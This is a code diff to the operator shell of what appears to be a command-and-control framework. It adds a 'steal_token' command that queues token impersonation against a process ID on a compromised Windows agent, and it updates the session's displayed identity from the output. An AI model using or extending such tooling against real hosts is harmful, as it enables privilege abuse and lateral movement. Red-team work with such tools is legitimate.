@@ -8,6 +8,7 @@ State machine with two contexts:
 
 import asyncio
 import logging
+import re
 import shlex
 from datetime import datetime
 from pathlib import Path
@@ -329,6 +330,27 @@ class OperatorShell:
                 self._stop_prompt_refresh()
             return
 
+        if cmd == "steal_token":
+            if not args:
+                console.print("[red]Usage: steal_token <PID>[/red]")
+                return
+            pid_str = args[0]
+            try:
+                int(pid_str)
+            except ValueError:
+                console.print(f"[red]Invalid PID: {pid_str}[/red]")
+                return
+            self.task_manager.create_task(
+                agent, TaskType.NATIVE, "steal_token",
+                arguments=pid_str.encode(),
+            )
+            self.logger.log_command(
+                agent.agent_id, agent.hostname, agent.username,
+                "steal_token", {"pid": pid_str},
+            )
+            console.print(f"[green]Task queued: steal_token {pid_str}[/green]")
+            return
+
         if cmd in ("shell", "powershell"):
             console.print(
                 f"[bold red]WARNING: '{cmd}' spawns a child process. "
@@ -631,6 +653,16 @@ class OperatorShell:
                     session._original_integrity = session.integrity
                 session.username = "NT AUTHORITY\\SYSTEM"
                 session.integrity = "SYSTEM"
+                self._invalidate_prompt()
+            elif task.module_name == "steal_token" and "Successfully stole" in text_preview:
+                # Save original identity so rev2self can restore it
+                if not hasattr(session, "_original_username"):
+                    session._original_username = session.username
+                    session._original_integrity = session.integrity
+                # Parse stolen identity from output: "Impersonating: DOMAIN\user"
+                m = re.search(r"Impersonating:\s*(.+)", text_preview)
+                if m:
+                    session.username = m.group(1).strip()
                 self._invalidate_prompt()
             elif task.module_name == "rev2self" and "Reverted" in text_preview:
                 if hasattr(session, "_original_username"):
